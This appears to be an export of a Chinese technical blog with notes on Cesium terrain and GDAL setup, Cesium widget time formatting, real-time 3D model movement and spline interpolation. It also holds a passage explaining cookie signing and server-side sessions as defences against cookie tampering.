<h3 id="卫星图像蓝边的处理"><a href="#卫星图像蓝边的处理" class="headerlink" title="卫星图像蓝边的处理"></a>卫星图像蓝边的处理</h3><p>卫星图像在浏览的过程中有可能会出现蓝边，其原因是瓦片下载过程中的边界没有处理好。解决思路是严格按照瓦片的经纬度设定边界。可通过<a href="https://www.maptiler.com/google-maps-coordinates-tile-bounds-projection/" target="_blank" rel="noopener">google-maps-coordinates-tile-bounds-projection</a>查询特定级别瓦片的各个顶点的经纬度。</p>
<h2 id="地形的获取和处理"><a href="#地形的获取和处理" class="headerlink" title="地形的获取和处理"></a>地形的获取和处理</h2><p>Cesium支持多种地形provider来接收地形数据瓦片<sup>[8]</sup>：</p>
<ol>
<li>Cesium Terrain Server——高分辨率的全球地形数据，支持地形光照和水流效果。地形瓦片提交给客户端的数据的格式用的是quantized-mesh v1.0。</li>
<li>Esri ArcGIS Image Server——从Esri影像服务里的高度图中产生地形数据集。详情见Cesium里的ArcGisImageServerTerrainProvider.</li>
<li>VR-TheWorld Server——从一个VR-TheWorld服务里的高度图中产生地形数据。它们的托管服务器有全球90米的数据，包括深度测量。</li>
<li>Ellipsoid——是Cesium默认的地形provider，是一个光滑的椭球面，没有现实的地形，地形高度为0。  </li>
</ol>
<p>常用的CesiumTerrainProvider支持两种格式的地形：一种是quantized-mesh格式的地形数据，另一种是基于高度图技术的DEM。前一种技术是Cesium独有不开放，因此将使用DEM数据在Cesium中渲染地形。  </p>
<p>DEM数据是数字高程模型，是描述每个点位的高程数据，没有其他附加信息<sup>[9]</sup>。DEM数据在ArcGIS中打开只能看到是灰度图。通过相关软件可直接下载各大地图服务商的高程数据，但没有在Cesium中加载成功。下面介绍一种经过验证可在Cesium中成功加载地形的方法：</p>
<ol>
<li>下载地形数据。可以从<a href="http://www.gscloud.cn/" target="_blank" rel="noopener">地理空间数据云</a>下载地形数据。注册登录后，在首页选择“DEM 数字高程数据”，在选择“GDEMV2 30M 分辨率数字高程数据”。</li>
<li>合并地形数据。使用GDAL下的gdal_merge.py工具将下载的地形数据合并成一个Tif文件。<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdal_merge.py -o out.tif input1.tif input2.tif</span><br></pre></td></tr></table></figure></li>
<li>切割地形数据。使用牛人制作的gdal2srtmtiles.py脚本分割地形数据。编辑gdal2srtmtiles.py，在最后设置高程文件和输出目录。参考链接<a href="https://blog.csdn.net/qq_36377037/article/details/86300330" target="_blank" rel="noopener">工具gdal2srtmtiles的安装使用</a>。或者参考<a href="http://mars3d.cn/dev/guide/data/terrain.html#_1-tif%E5%92%8Cterrain%E6%A0%BC%E5%BC%8F%E4%BB%8B%E7%BB%8D" target="_blank" rel="noopener">地形数据：TIF地形转terrain格式</a>。</li>
<li>发布地形服务。把terrain_tiles直接放到与 Cesium同端口的Tomcat或IIS站点。<br>下（不能跨域），即可发布服务。 需要在Web Server中增加配置 .terrain文件的 Content-Type设为 application/octet-stream，同时拷贝“覆盖至生成tiles结果”目录中的 layer.json文件和0文件夹至生成结果目录下，比如我当前是 terrain_tiles目录下。</li>
</ol>
<p><strong>注意：地形切片至少要到14级，地形分辨率太低将导致卫星影像失真。</strong></p>
<h2 id="GDAL的安装使用"><a href="#GDAL的安装使用" class="headerlink" title="GDAL的安装使用"></a>GDAL的安装使用</h2><p>GDAL(Geospatial Data Abstraction Library)是一个在X/MIT许可协议下的开源栅格空间数据转换库。该项目由Frank Warmerdam教授于1998年发起。 它利用抽象数据模型来表达所支持的各种文件格式。 它还有一系列命令行工具来进行数据转换和处理。 OGR(OpenGIS Simple Features Reference Implementation)是GDAL项目的一个子项目， 提供对矢量数据的支持。 一般把这两个库合称为GDAL/OGR，或者简称为GDAL。</p>
<h3 id="GDAL安装方法之一"><a href="#GDAL安装方法之一" class="headerlink" title="GDAL安装方法之一"></a>GDAL安装方法之一</h3><p>GDAL不推荐从源码编译安装，建议从gisinternals下载gdal-203-1911-x64-core.msi、GDAL-2.3.0.win-amd64-py2.7.msi直接二进制安装。安装步骤如下：</p>
<ol>
<li>安装python2.7。安装完成后配置环境变量，在path中添加 C:\Python27;</li>
<li>安装gdal-203-1911-x64-core.msi。安装完成后，设置环境变量GDAL_DATA，值为C:\Program Files\GDAL\gdal-data\，修改环境变量PATH，增加C:\Program Files\GDAL; </li>
<li>pip install numpy。这是为了使用地形切割的脚本gdal2srtmtiles.py。</li>
<li>安装GDAL-2.3.0.win-amd64-py2.7.msi。</li>
</ol>
<p><strong>注意：当瓦片过多时，会报“OverflowError: range() result has too many items”的错误，而且python2已不再维护，因此不建议采用该方法安装GDAL。</strong></p>
<h3 id="GDAL安装方法之二"><a href="#GDAL安装方法之二" class="headerlink" title="GDAL安装方法之二"></a>GDAL安装方法之二</h3><p>OSGeo4W是用于开源GIS项目的Windows安装程序。 开源的本质意味着许多项目/程序相互依赖才能实现功能。 GDAL就是一个很好的例子。 几乎所有的开源GIS项目都在某种程度上使用GDAL来读写数据。 但是因为Windows是一个封闭的平台，所以它没有像基于Unix的操作系统那样开发软件包管理器。 因此，如果使用GRASS和QGIS的独立安装程序安装它们，则最终会进行2次GDAL安装。 添加3或4个以上的开源安装，最终您将获得十几个GDAL安装，此外还有一个仅用于GDAL的安装。</p>
<p>这就是OSGeo4W的用处。它可以跟踪开源GIS软件包的共享需求，因此QGIS和GRASS可以共享一次GDAL安装。 它还跟踪版本，因此您可以简单地升级程序。</p>
<p>从官网<a href="http://www.klokan.cz/projects/gdal2tiles/" target="_blank" rel="noopener">GDAL2Tiles Project</a>找到 OSGeo4W 的下载链接，下载OSGeo4W并安装即可。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://cesiumjs.org/tutorials/Imagery-Layers-Tutorial/" target="_blank" rel="noopener">Imagery-Layers-Tutorial</a>, by cesiumjs</li>
<li><a href="https://cesiumjs.org/tutorials/Terrain-Tutorial/" target="_blank" rel="noopener">Terrain-Tutorial</a>, by cesiumjs</li>
<li><a href="http://cntchen.github.io/2016/05/09/国内主要地图瓦片坐标系定义及计算原理/" target="_blank" rel="noopener">国内主要地图瓦片坐标系定义及计算原理</a>, by CntChen</li>
<li><a href="https://zh.wikipedia.org/wiki/地图投影" target="_blank" rel="noopener">地图投影</a>, by wikipedia</li>
<li><a href="https://yanyinhong.github.io/2017/05/02/How-to-insert-image-in-hexo-post/" target="_blank" rel="noopener">Hexo博客搭建之在文章中插入图片</a>, by Yan Yinhong</li>
<li><a href="https://blog.csdn.net/wbz810/article/details/79294511" target="_blank" rel="noopener">用ArcMap给遥感影像(tif格式)加入地理坐标</a>，by wbz810.</li>
<li><a href="http://www.gdal.org/" target="_blank" rel="noopener">GDAL</a>，by gdal</li>
<li><a href="https://blog.csdn.net/u013929284/article/details/71616600" target="_blank" rel="noopener">Cesium之地形(1)</a>, by Super洛伽</li>
<li><a href="https://www.jianshu.com/p/62d6f03f44e3" target="_blank" rel="noopener">Cesium中地形数据的加载</a>，by CrazyGIS</li>
<li><a href="https://www.giserdqy.com/webgis/openlayers/22833/openlayers%E4%B9%8B%E5%A4%9A%E6%BA%90%E6%95%B0%E6%8D%AE%E5%8A%A0%E8%BD%BD%E4%BA%8C%EF%BC%9A%E7%93%A6%E7%89%87%E5%9C%B0%E5%9B%BE%E5%8E%9F%E7%90%86/" target="_blank" rel="noopener">OpenLayers之多源数据加载二：瓦片地图原理</a>,by giser.</li>
<li><a href="https://www.cnblogs.com/nygfcn1234/p/8876711.html" target="_blank" rel="noopener">cesium加载离线tms切片</a>,by nygfcn.</li>
<li><a href="https://zh.wikipedia.org/wiki/TIFF" target="_blank" rel="noopener">TIFF</a>,by wikipedia.</li>
<li><a href="https://wiki.osgeo.org/wiki/Tile_Map_Service_Specification" target="_blank" rel="noopener">Tile_Map_Service_Specification</a>,by osgeo.</li>
<li><a href="https://blog.csdn.net/dcraw/article/details/6443537" target="_blank" rel="noopener">TIFF图像文件格式详解(1)</a>,by xdyang.</li>
<li><a href="http://www.cppblog.com/windcsn/archive/2005/11/16/1158.aspx" target="_blank" rel="noopener">TIFF图像文件格式分析</a>,by windcsn.</li>
<li><a href="https://www.osgeo.cn/python_gdal_utah_tutorial/ch01.html" target="_blank" rel="noopener">1. 地理数据处理软件包GDAL简介</a>,by osgeo.cn.</li>
<li><a href="https://www.maptiler.com/google-maps-coordinates-tile-bounds-projection/" target="_blank" rel="noopener">google-maps-coordinates-tile-bounds-projection</a>,by maptiler.</li>
<li><a href="https://theonegis.gitbook.io/geopy/" target="_blank" rel="noopener">geopy</a>,by theonegis.</li>
<li><a href="https://blog.csdn.net/qq_36377037/article/details/86300330" target="_blank" rel="noopener">工具gdal2srtmtiles的安装使用</a>,by 四域公子.</li>
<li><a href="http://mars3d.cn/dev/guide/data/terrain.html#_1-tif%E5%92%8Cterrain%E6%A0%BC%E5%BC%8F%E4%BB%8B%E7%BB%8D" target="_blank" rel="noopener">地形数据：TIF地形转terrain格式</a>,by mars3d.</li>
<li><a href="http://mars3d.cn/dev/guide/data/xyz.html#_1-tif%E6%A0%BC%E5%BC%8F%E4%BB%8B%E7%BB%8D" target="_blank" rel="noopener">瓦片底图：TIF影像金字塔切片处理及加载</a>,by mars3d.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>Cesium</tag>
      </tags>
  </entry>
  <entry>
    <title>Cesium小部件animation和timeline的系统时间显示</title>
    <url>/2018/06/09/Cesium%E5%B0%8F%E9%83%A8%E4%BB%B6animation%E5%92%8Ctimeline%E7%9A%84%E7%B3%BB%E7%BB%9F%E6%97%B6%E9%97%B4%E6%98%BE%E7%A4%BA/</url>
    <content><![CDATA[<p>Cesium的小部件animation和timeline显示UTC系统时间，需要将其改为本地系统时间。修改方法如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">this.viewer.animation.viewModel.dateFormatter &#x3D; localeDateTimeFormatter</span><br><span class="line">this.viewer.animation.viewModel.timeFormatter &#x3D; localeTimeFormatter</span><br><span class="line">this.viewer.timeline.makeLabel &#x3D; function (time) &#123; return localeDateTimeFormatter(time) &#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Date formatting to a global form</span><br><span class="line">function localeDateTimeFormatter(datetime, viewModel, ignoredate) &#123;</span><br><span class="line">    var julianDT &#x3D; new Cesium.JulianDate(); </span><br><span class="line">    Cesium.JulianDate.addHours(datetime,8,julianDT)</span><br><span class="line">    var gregorianDT&#x3D; Cesium.JulianDate.toGregorianDate(julianDT)</span><br><span class="line">    var objDT;</span><br><span class="line">    if (ignoredate)</span><br><span class="line">        objDT &#x3D; &#39;&#39;;</span><br><span class="line">    else &#123;</span><br><span class="line">        objDT &#x3D; new Date(gregorianDT.year, gregorianDT.month - 1, gregorianDT.day);</span><br><span class="line">        objDT &#x3D; gregorianDT.year  + &#39;年&#39; +objDT.toLocaleString(&quot;zh-cn&quot;, &#123; month: &quot;short&quot; &#125;)+ gregorianDT.day + &#39;日&#39; ;</span><br><span class="line">        if (viewModel || gregorianDT.hour + gregorianDT.minute &#x3D;&#x3D;&#x3D; 0)</span><br><span class="line">        return objDT;</span><br><span class="line">        objDT +&#x3D; &#39; &#39;;</span><br><span class="line">    &#125;</span><br><span class="line">    return objDT + Cesium.sprintf(&quot;%02d:%02d:%02d&quot;, gregorianDT.hour, gregorianDT.minute, gregorianDT.second);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function localeTimeFormatter(time, viewModel) &#123;</span><br><span class="line">    return localeDateTimeFormatter(time, viewModel, true);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上述代码还存在一个问题，当timeline小部件不活动时，其仍然显示UTC标准系统时间。</p>
<p>Cesium的credit十分碍眼，采用如下方法去掉：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;去除版权信息</span><br><span class="line">viewer._cesiumWidget._creditContainer.style.display &#x3D; &quot;none&quot;;</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://blog.csdn.net/chienchia/article/details/29185479" target="_blank" rel="noopener">EST，CST，PST，GMT，UTC，EDT等等时间缩写</a>, by chienchia.</li>
<li><a href="https://stackoverflow.com/questions/45875490/change-utc-timezone-to-sgt-timezone-in-cesiumjs" target="_blank" rel="noopener">Change UTC timezone to SGT timezone in Cesiumjs</a>, by stackoverflow.</li>
<li><a href="https://blog.csdn.net/dyxcome/article/details/82818412" target="_blank" rel="noopener">Cesium去掉logo</a>,by 跃然实验室.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>Cesium</tag>
      </tags>
  </entry>
  <entry>
    <title>Cesium中3D模型的驱动方法</title>
    <url>/2018/12/26/Cesium%E4%B8%AD3D%E6%A8%A1%E5%9E%8B%E7%9A%84%E9%A9%B1%E5%8A%A8%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>Cesium中3D模型的运动可以使用CZML直接驱动，但使用该方法前提是能事先计算出3D模型的运动轨迹，具有很大的局限性。那么如何实时驱动3D模型呢？</p>
<h1 id="Cesium渲染过程分析"><a href="#Cesium渲染过程分析" class="headerlink" title="Cesium渲染过程分析"></a>Cesium渲染过程分析</h1><p>Cesium渲染过程的分析可以参考链接1。Cesium的渲染始于虚拟地球组件CesiumWidget的startRenderLoop方法，在该方法中将调用requestAnimationFrame函数开始渲染。</p>
<p>虚拟地球组件CesiumWidget包含Scene组件，在其render方法随后调用Scene的render方法。在场景组件Scene的render方法中提供了preUpdate、postUpdate、preRender、postRender四个事件对象，这四个事件对象将是我们实时驱动3D模型的关键。</p>
<h2 id="preUpdate事件"><a href="#preUpdate事件" class="headerlink" title="preUpdate事件"></a>preUpdate事件</h2><p>在Cesium更新渲染周期开始之前以目标帧率触发preUpdate事件。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">scene.postUpdate.addEventListener(function() &#123;</span><br><span class="line">    &#x2F;&#x2F; This code will run at 60 FPS</span><br><span class="line">    if (changeToPromptRender) &#123;</span><br><span class="line">        scene.requestRender();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h2 id="postUpdate事件"><a href="#postUpdate事件" class="headerlink" title="postUpdate事件"></a>postUpdate事件</h2><p>在场景更新之后，新帧渲染之前以目标帧率触发postUpdate事件。</p>
<h2 id="preRender事件"><a href="#preRender事件" class="headerlink" title="preRender事件"></a>preRender事件</h2><p>在场景更新之后，新帧渲染之前触发preRender事件。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">scene.preRender.addEventListener(function() &#123;</span><br><span class="line">    &#x2F;&#x2F; This code will run when a new frame is rendered</span><br><span class="line">    &#x2F;&#x2F; including when changeToPromptRender is true</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h2 id="postRender事件"><a href="#postRender事件" class="headerlink" title="postRender事件"></a>postRender事件</h2><p>在新帧渲染之后触发postRender事件。</p>
<h1 id="实时驱动3D模型"><a href="#实时驱动3D模型" class="headerlink" title="实时驱动3D模型"></a>实时驱动3D模型</h1><p>从上一节对Cesium渲染过程分析可知，要实时驱动3D模型，应订阅场景Scene的preUpdate事件，在preUpdate事件的处理函数中改变3D模型的位置和姿态。</p>
<h2 id="订阅preUpdate事件"><a href="#订阅preUpdate事件" class="headerlink" title="订阅preUpdate事件"></a>订阅preUpdate事件</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;订阅场景的preUpdate事件</span><br><span class="line">viewer.scene.preUpdate.addEventListener(function(scene, time) &#123;</span><br><span class="line">    speedVector &#x3D; Cesium.Cartesian3.multiplyByScalar(Cesium.Cartesian3.UNIT_X, speed &#x2F; 10, speedVector);</span><br><span class="line">    position &#x3D; Cesium.Matrix4.multiplyByPoint(planePrimitive.modelMatrix, speedVector, position);</span><br><span class="line">    pathPosition.addSample(Cesium.JulianDate.now(), position);</span><br><span class="line">    Cesium.Transforms.headingPitchRollToFixedFrame(position, hpRoll, Cesium.Ellipsoid.WGS84, fixedFrameTransform, planePrimitive.modelMatrix);</span><br><span class="line"></span><br><span class="line">    if (fromBehind.checked) &#123;</span><br><span class="line">        &#x2F;&#x2F; Zoom to model</span><br><span class="line">        Cesium.Matrix4.multiplyByPoint(planePrimitive.modelMatrix, planePrimitive.boundingSphere.center, center);</span><br><span class="line">        hpRange.heading &#x3D; hpRoll.heading;</span><br><span class="line">        hpRange.pitch &#x3D; hpRoll.pitch;</span><br><span class="line">        camera.lookAt(center, hpRange);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h2 id="获取czml实体的参数"><a href="#获取czml实体的参数" class="headerlink" title="获取czml实体的参数"></a>获取czml实体的参数</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">viewer.scene.preUpdate.addEventListener(function(scene, time) &#123;</span><br><span class="line">    &#x2F;&#x2F;target是czml实体对象</span><br><span class="line">    &#x2F;&#x2F;获取time时刻target的位置参数</span><br><span class="line">    target.position.getValue(time,position)</span><br><span class="line">    console.log(position)</span><br><span class="line">    </span><br><span class="line">    target.orientation.getValue(time,orientation)</span><br><span class="line">    console.log(orientation)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">viewer.scene.preUpdate.addEventListener(function(scene, time) &#123;</span><br><span class="line">    var pos&#x3D;target.position.getValue(time)</span><br><span class="line">    console.log(pos.toString())</span><br><span class="line">    &#x2F;&#x2F;世界坐标转经纬高</span><br><span class="line">    var cartographicPosition &#x3D; Cesium.Ellipsoid.WGS84.cartesianToCartographic(pos);</span><br><span class="line">    console.log(cartographicPosition.toString())</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h2 id="使用Entity-API加载3D模型"><a href="#使用Entity-API加载3D模型" class="headerlink" title="使用Entity API加载3D模型"></a>使用Entity API加载3D模型</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var viewer &#x3D; new Cesium.Viewer(&#39;cesiumContainer&#39;);</span><br><span class="line">var center&#x3D;Cesium.Cartesian3.fromDegrees(-123.0744619, 44.0503706,100);</span><br><span class="line">var hpr&#x3D;Cesium.HeadingPitchRoll.fromDegrees(90,-90,0);</span><br><span class="line">&#x2F;&#x2F;从headingPitchRoll转四元数</span><br><span class="line">var quatern&#x3D;Cesium.Transforms.headingPitchRollQuaternion(center,hpr);</span><br><span class="line"></span><br><span class="line">var entity &#x3D; viewer.entities.add(&#123;</span><br><span class="line">    position :center ,    </span><br><span class="line">    orientation:quatern ,</span><br><span class="line">    model : &#123;</span><br><span class="line">        uri : &#39;..&#x2F;..&#x2F;..&#x2F;..&#x2F;Apps&#x2F;SampleData&#x2F;models&#x2F;missile.glb&#39;,</span><br><span class="line">        scale: 0.1,</span><br><span class="line">        minimumPixelSize:50,</span><br><span class="line">        maximumScale:5000</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">viewer.trackedEntity &#x3D; entity;</span><br></pre></td></tr></table></figure>

<h2 id="使用Primitive-API加载3d模型"><a href="#使用Primitive-API加载3d模型" class="headerlink" title="使用Primitive API加载3d模型"></a>使用Primitive API加载3d模型</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var viewer &#x3D; new Cesium.Viewer(&#39;cesiumContainer&#39;);</span><br><span class="line"></span><br><span class="line">var center1&#x3D;Cesium.Cartesian3.fromDegrees(-123.0744619, 44.0503706,100);</span><br><span class="line">var hpr1&#x3D;Cesium.HeadingPitchRoll.fromDegrees(90,-90,100);</span><br><span class="line">&#x2F;&#x2F;计算模式矩阵，实现本地坐标系坐标到世界坐标系坐标的转换</span><br><span class="line">var modelMatrix&#x3D;Cesium.Transforms.headingPitchRollToFixedFrame(center1, hpr1)</span><br><span class="line"></span><br><span class="line">var model &#x3D; viewer.scene.primitives.add(Cesium.Model.fromGltf(&#123;</span><br><span class="line">    url : &#39;..&#x2F;..&#x2F;..&#x2F;..&#x2F;Apps&#x2F;SampleData&#x2F;models&#x2F;missile.glb&#39;,</span><br><span class="line">    modelMatrix : modelMatrix,</span><br><span class="line">    scale : 1.0</span><br><span class="line">&#125;));</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://huangwang.github.io/2018/11/08/Cesium摄像头跟踪飞机实体时晃动问题分析/">Cesium摄像头跟踪飞机实体时晃动问题分析</a>,by jack huang.</li>
<li><a href="https://cesium.com/blog/2018/01/24/cesium-scene-rendering-performance/" target="_blank" rel="noopener">Improving Performance with Explicit Rendering</a>, by Gabby Getz.</li>
<li><a href="https://blog.51cto.com/u_15127585/2783324" target="_blank" rel="noopener">Cesium 源码打包入门 [ver1.72] </a>,by mob604756f3c518.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>Cesium</tag>
      </tags>
  </entry>
  <entry>
    <title>Cesium样条插值方法</title>
    <url>/2020/09/19/Cesium%E6%A0%B7%E6%9D%A1%E6%8F%92%E5%80%BC%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>Cesium样条插值主要有三种：Linear、Lagrange、Hermite。理解Cesium样条插值对生成平滑飞行路径十分关键。</p>
<h1 id="插值概念"><a href="#插值概念" class="headerlink" title="插值概念"></a>插值概念</h1><p>在数学的数值分析领域中，内插或称插值（英语：interpolation）是一种通过已知的、离散的数据点，在范围内推求新数据点的过程或方法。求解科学和工程的问题时，通常有许多数据点借由采样、实验等方法获得，这些数据可能代表了有限个数值函数，其中自变量的值。而根据这些数据，我们往往希望得到一个连续的函数（也就是曲线）；或者更密集的离散方程与已知数据互相吻合，这个过程叫做拟合。</p>
<p>与插值密切相关的另一个问题是通过简单函数逼近复杂函数。假设给定函数的公式是已知的，但是太复杂以至于不能有效地进行评估。来自原始函数的一些已知数据点，或许会使用较简单的函数来产生插值。当然，若使用一个简单的函数来估计原始数据点时，通常会出现插值误差；然而，取决于该问题领域和所使用的插值方法，以简单函数推得的插值数据，可能会比所导致的精度损失更大。</p>
<p>在数值分析这个数学分支中，样条插值是使用一种名为样条的特殊分段多项式进行插值的形式。由于样条插值可以使用低阶多项式样条实现较小的插值误差，这样就避免了使用高阶多项式所出现的龙格现象，所以样条插值得到了流行。</p>
<h1 id="插值定义"><a href="#插值定义" class="headerlink" title="插值定义"></a>插值定义</h1><p>给定$n$个离散数据点（称为节点）${\displaystyle (x_{k},y_{k})}(x_{k},y_{k})，{\displaystyle k=1,2,…,n}$。对于${\displaystyle x,(x\neq x_{k},k=1,2,…n)}$，求${\displaystyle x}$所对应的$y$的值称为内插。</p>
<p>$f(x)$为定义在区间$[a,b]$上的函数。${\displaystyle x_{1},x_{2},x_{3}…x_{n}}$为$[a,b]$上 $n$ 个互不相同的点，$G$ 为给定的某一函数类。若$G$ 上有函数$g(x)$ 满足：</p>
<p>$$g(x_{i})=f(x_{i}),k=1,2,…n$$</p>
<p>则称 $g(x)$为 $f(x)$ 关于节点 $x_{1},x_{2},x_{3}…x_{n}$ 在 $G$ 上的插值函数。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.cnblogs.com/giserhome/archive/2019/06/20/11061499.html" target="_blank" rel="noopener">Cesium专栏-样条插值(平滑路径、飞行动画，源码下载)</a>,by  GIS之家.</li>
<li><a href="https://zhuanlan.zhihu.com/p/50534090" target="_blank" rel="noopener">Cesium的Property机制总结</a>,by vtxf.</li>
<li><a href="https://zh.wikipedia.org/wiki/%E6%8F%92%E5%80%BC" target="_blank" rel="noopener">插值</a>,by wikipedia.</li>
<li><a href="https://zh.wikipedia.org/wiki/%E6%A0%B7%E6%9D%A1%E6%8F%92%E5%80%BC" target="_blank" rel="noopener">样条插值</a>,by wikipedia.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>Cesium</tag>
      </tags>
  </entry>
  <entry>
    <title>Cookie,Session和Token会话知识整理</title>
    <url>/2018/07/08/Cookie-Session%E5%92%8CToken%E4%BC%9A%E8%AF%9D%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/</url>
    <content><![CDATA[<p>HTTP是一种无状态的协议，然而当服务器端需要判断用户能否访问某些资源，记录用户的购物车内容等场景时，就需要一种机制维护会话状态，这时候Cookie、Session和Token就派上了用场。</p>
<h1 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h1><p>Cookie技术最早用于解决HTTP的会话问题， 它是 http 协议的一部分，它的处理分为如下几步：</p>
<ul>
<li>服务器向客户端发送 cookie。<ul>
<li>通常使用 HTTP 协议规定的 set-cookie 头操作。</li>
<li>规范规定 cookie 的格式为 name = value 格式，且必须包含这部分。</li>
</ul>
</li>
<li>浏览器将 cookie 保存。</li>
<li>每次请求浏览器都会将 cookie 发向服务器。</li>
</ul>
<h2 id="可选的Cookie参数"><a href="#可选的Cookie参数" class="headerlink" title="可选的Cookie参数"></a>可选的Cookie参数</h2><p>其他可选的 cookie 参数会影响将 cookie 发送给服务器端的过程，主要有以下几种：</p>
<ul>
<li>path：表示 cookie 影响到的路径，匹配该路径才发送这个 cookie。</li>
<li>expires 和 maxAge：告诉浏览器这个 cookie 什么时候过期，expires 是 UTC 格式时间，maxAge 是 cookie 多久后过期的相对时间。当不设置这两个选项时，会产生 session cookie，session cookie 是 transient 的，当用户关闭浏览器时，就被清除。一般用来保存 session 的 session_id。</li>
<li>secure：当 secure 值为 true 时，cookie 在 HTTP 中是无效，在 HTTPS 中才有效。</li>
<li>httpOnly：浏览器不允许脚本操作 document.cookie 去更改 cookie。一般情况下都应该设置这个为 true，这样可以避免被 xss 攻击拿到 cookie。</li>
</ul>
<h2 id="常用场景"><a href="#常用场景" class="headerlink" title="常用场景"></a>常用场景</h2><p>当给Cookie设置expires和maxAge后，在未到期前，浏览器端的Cookie不会因为浏览器的关闭而消失。该特性常用于自动登录，记录用户浏览信息。例如很多购物网站常用该特性记录用户的喜好和购买的物品。</p>
<h2 id="Cookie安全隐患"><a href="#Cookie安全隐患" class="headerlink" title="Cookie安全隐患"></a>Cookie安全隐患</h2><p>Cookie提供了一种手段使得HTTP请求可以附加当前状态， 大多数网站就是靠Cookie来标识用户的登录状态的，例如：</p>
<ol>
<li>用户提交用户名和密码的表单，这通常是一个POST HTTP请求。</li>
<li>服务器验证用户名与密码，如果合法则返回200（OK）并设置Set-Cookie为authed=true。</li>
<li>浏览器存储该Cookie。</li>
<li>浏览器发送请求时，设置Cookie字段为authed=true。</li>
<li>服务器收到第二次请求，从Cookie字段得知该用户已经登录。 按照已登录用户的权限来处理此次请求。</li>
</ol>
<p>上述认证流程存在安全隐患，因为Cookie是可以被篡改的。如果使用一些HTTP客户端软件，设置Cookie字段为authed=true并发送该HTTP请求，服务器就会被欺骗。</p>
<h2 id="Cookie防篡改机制"><a href="#Cookie防篡改机制" class="headerlink" title="Cookie防篡改机制"></a>Cookie防篡改机制</h2><p>服务器为每个Cookie项生成签名，可有效地防止Cookie被篡改。因为用户篡改Cookie后无法生成对应的签名， 服务器便可得知用户对Cookie进行了篡改。一个简单的校验过程可能是这样的：</p>
<ol>
<li>在服务器中配置一个不为人知的字符串（我们叫它Secret），比如：x$sfz32。</li>
<li>当服务器需要设置Cookie时（比如authed=false），不仅设置authed的值为false， 在值的后面进一步设置一个签名，最终设置的Cookie是authed=false|6hTiBl7lVpd1P。</li>
<li>签名6hTiBl7lVpd1P是这样生成的：Hash(‘x$sfz32’+’false’)。 要设置的值与Secret相加再取哈希。</li>
<li>用户收到HTTP响应并发现头字段Set-Cookie: authed=false|6hTiBl7lVpd1P。</li>
<li>用户在发送HTTP请求时，篡改了authed值，设置头字段Cookie: authed=true|???。 因为用户不知道Secret，无法生成签名，只能随便填一个。</li>
<li>服务器收到HTTP请求，发现Cookie: authed=true|???。服务器开始进行校验： Hash(‘true’+’x$sfz32’)，便会发现用户提供的签名不正确。</li>
</ol>
<p>通过给Cookie添加签名，使得服务器得以知道Cookie被篡改。然而故事并未结束。</p>
<p>因为Cookie是明文传输的， 只要服务器设置过一次authed=true|xxxx我不就知道true的签名是xxxx了么， 以后就可以用这个签名来欺骗服务器了。因此Cookie中最好不要放敏感数据。 一般来讲Cookie中只会放一个Session Id，而Session存储在服务器端。</p>
<h1 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h1><p>为了解决Cookie的安全隐患，Session机制应运而生。session机制是一种服务器端的机制，它存储在服务器端的，避免了在客户端Cookie中存储敏感数据。Session可以存储在HTTP服务器的内存中，也可以存在内存数据库（如redis）中， 对于重量级的应用甚至可以存储在数据库中。 </p>
<p>客户端对服务端请求时,服务端会检查请求中是否包含一个session标识( 称为session id ).</p>
<ul>
<li>如果没有,那么服务端就生成一个随机的session以及和它匹配的session id,并将session id返回给客户端.</li>
<li>如果有,那么服务器就在存储中根据session id 查找到对应的session.</li>
</ul>
<h2 id="基于Session的登录流程"><a href="#基于Session的登录流程" class="headerlink" title="基于Session的登录流程"></a>基于Session的登录流程</h2><p>一个简单的使用Session机制的登录流程可能是这样的：</p>
<ol>
<li>用户提交包含用户名和密码的表单，发送HTTP请求。</li>
<li>服务器验证用户发来的用户名密码。</li>
<li>如果正确则把当前用户名（通常是用户对象）存储到redis中，并生成它在redis中的ID。这个ID称为Session ID，通过Session ID可以从Redis中取出对应的用户对象， 敏感数据（比如authed=true）都存储在这个用户对象中。</li>
<li>设置Cookie为sessionId=xxxxxx|checksum并发送HTTP响应， 仍然为每一项Cookie都设置签名。</li>
